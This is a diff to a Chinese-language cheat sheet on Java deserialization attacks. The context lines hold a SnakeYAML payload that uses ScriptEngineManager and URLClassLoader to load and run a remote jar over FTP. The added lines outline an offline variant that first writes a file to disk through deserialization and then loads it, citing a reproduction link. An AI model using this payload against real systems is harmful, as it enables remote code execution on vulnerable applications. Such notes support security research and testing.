@@ -63,6 +63,18 @@ ftp 可以换为HTTP 及其他支持协议
 ```
 !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["ftp://127.0.0.1:8000/yaml-payload4.jar"]]]]
 ```
+
+不出网时： 
+ScriptEngineManager(目前比较通用的一种方式，思路也比较好。同时拓展一下如果可以通过反序列化落地，那如果拥有上传接口也可以通过上传落地再进行加载。)
+
+第一步：通过反序列化实现文件落地
+
+第二步：加载本地文件内容
+
+```
+复现链接：https://xz.aliyun.com/t/10655
+```
+
 ## Fastjson
 
 ```
